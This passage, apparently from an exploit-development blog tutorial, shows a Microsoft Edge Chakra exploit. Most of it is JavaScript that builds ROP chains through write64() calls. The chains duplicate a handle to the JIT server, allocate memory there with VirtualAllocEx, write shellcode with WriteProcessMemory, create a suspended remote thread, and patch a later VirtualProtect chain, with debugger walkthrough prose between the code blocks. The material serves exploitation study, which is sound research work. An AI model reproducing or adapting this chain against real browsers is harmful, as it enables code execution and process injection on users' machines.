write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();

// VirtuaAllocEx() ROP chain
// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

// DWORD flAllocationType (R9)
// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
/*
0:031> ? 0x00002000 | 0x00001000 
Evaluate expression: 12288 = 00000000`00003000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// SIZE_T dwSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPVOID lpAddress (RDX)
// Let VirtualAllocEx decide where the memory will be located
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it

// Call KERNELBASE!VirtualAllocEx
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain
// Stage 3 -> Write our shellcode into the JIT process

// Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

/*
0:015> dq kernelbase+0x216000+0x4000 L2
00007fff`58cfa000  00000000`00000000 00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     // Recall RAX already has a writable pointer in it

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);      // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// CreateRemoteThread() ROP chain
// Stage 4 -> Create a thread within the JIT process, but create it suspended
// This will allow the thread to _not_ execute until we are ready
// LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later
// We will eventually hijack RSP of this thread with a ROP chain, and by setting RIP to a return gadget our thread, when executed, will return into our ROP chain
// We will update the thread later via another ROP chain to call SetThreadContext()

// LPTHREAD_START_ROUTINE lpStartAddress (R9)
// This can be any random data, since it will never be executed
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // 0x180043c63: Anything we want - this will never get executed
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();

// LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (default security properties)
next();

// SIZE_T dwStackSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // 0 (default stack size)
next();

// Call KERNELBASE!CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xdcfd0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
next();

// WriteProcessMemory() ROP chain (Number 2)
// Stage 5 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget for lpAddress

// Before, we need to preserve the thread HANDLE returned by CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where we will store the thread HANDLE
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetOne, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
```

Let's now walk through this in the debugger. We again set a breakpoint on `jmp rax` until we reach our call to `CreateRemoteThread`. From here we can `pt` this function call to pause at the `ret`, and view our first gadgets for our _new_ `WriteProcessMemory` ROP chain.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion135.png" alt="">

If we look at the above `WriteProcessMemory` ROP chain, we start off by actually preserving the value of the handle to the thread we just created in the `.data` section of `kernelbase.dll` (very similarly to what we did with preserving our `VirtualAllocEx` allocation). We can see this in action below (remember `CreateRemoteThread`'s return value is the handle value to the new thread. It is stored in RAX, so we can pull it directly from there):

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion136.png" alt="">

After preserving the address, we begin with our first parameter - `nSize`. Since we are just writing a pointer value, we specify `8` bytes (while dealing with the pesky `cmp r8d,  [rax]` instruction):

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion137.png" alt="">

Our function call is now in the following state:

```c
WriteProcessMemory(
	-
	-
	-
	0x8							// 64-bit pointer size (sizeof(QWORD)))
	-
);
```

The next parameter we will target is `hProcess`. This time we are not writing remotely, and we can simply use `-1`, or `0xFFFFFFFFFFFFFFFF`. This is the value returned by `GetCurrentProcess` to retrieve a handle to the current process. This tells `WriteProcessMemory` to perform this write process within the content process, where our `VirtualProtect` ROP chain is and where our exploit is currently executing. We can simply just write this value to the stack and `pop` it into RCX.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion138.png" alt="">

Our call is now in the current state:

```c
WriteProcessMemory(
	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Pseudo handle to the current process (the content process, when the exploit is executing)
	-
	-
	0x8							// 64-bit pointer size (sizeof(QWORD)))
	-
);
```

Next up is `lpBaseAddress` parameter. This is where we want `WriteProcessMemory` to write whatever data we want to. In this case, this is the location in the `VirtualProtect` ROP chain in the `.data` section of `chakra.dll`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion139.png" alt="">

Our call is now in the current state:

```c
WriteProcessMemory(
	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Pseudo handle to the current process (the content process, when the exploit is executing)
	addressof(VirtualProtectROPChain_offset),		// Address of our return value from VirtualAllocEx (where we want to write the VirtualAllocEx_allocation address to)
	-
	0x8							// 64-bit pointer size (sizeof(QWORD)))
	-
);
```

The next item to take care of is the `lpBuffer`. This memory address contains the contents we want to write to `lpBaseAddress`. Recall earlier that we stored our `VirtualAllocEx` allocation (our shellcode location in the remote process) into the `.data` section of `kernelbase.dll`. Since `lpBuffer` requires a pointer, we simply just need to place the `.data` address of our stored allocation into R8.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion140.png" alt="">

Our call is now in the following state:

```c
WriteProcessMemory(
	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Pseudo handle to the current process (the content process, when the exploit is executing)
	addressof(VirtualProtectROPChain_offset),		// Address of our return value from VirtualAllocEx (where we want to write the VirtualAllocEx_allocation address to)
	addressof(VirtualAllocEx_Allocation),			// Address of our VirtualAllocEx allocation (where our shellcode resides in the JIT process at this point in the exploit)
	0x8							// 64-bit pointer size (sizeof(QWORD)))
	-
);
```

The last parameter we need to write to the stack, so we will go ahead and load `WriteProcessMemory` into RAX and directly write our `NULL` value. 

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion141.png" alt="">

Here is our `VirtualProtect` ROP chain before (we are trying to update it an exploit runtime):

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion142.png" alt="">

After (using `pt` to execute the call to `WriteProcessMemory`, which pauses execution on the `ret`):

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion143.png" alt="">

As we can see, we successfully updated our ROP chain so that when the `VirtualProtect` ROP chain is eventually called, it is aware of where our shellcode is.

`WriteProcessMemory` ROP Chain (Round 3)
---

This ROP chain is _identical_ to the above ROP chain, except for the fact we want to overwrite a placeholder for the "fake return address" after our eventual call to `VirtualProtect`. We want `VirtualProtect`, after it is called, to transfer execution to our shellcode. This can be seen in a snippet of our `VirtualProtect` ROP chain.

```javascript
// Store the current offset within the .data section into a var
ropoffsetTwo = countMe;

write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // Will be updated with the VirtualAllocEx allocation (our shellcode)
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x1ef039, chakraHigh);         // 0x1801ef039: push rdi ; ret (Return into our shellcode)
inc();
```

We need to reconcile this, just like we did in our last `WriteProcessMemory` call, where we dynamically updated the ROP chain. Again, we need to use _another_ call to `WriteProcessMemory` to update this last location. This will ensure our eventual `VirtualProtect` ROP chain is good to go. We will omit these steps, as it is all documented above, but I will still provide the updated code below.

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
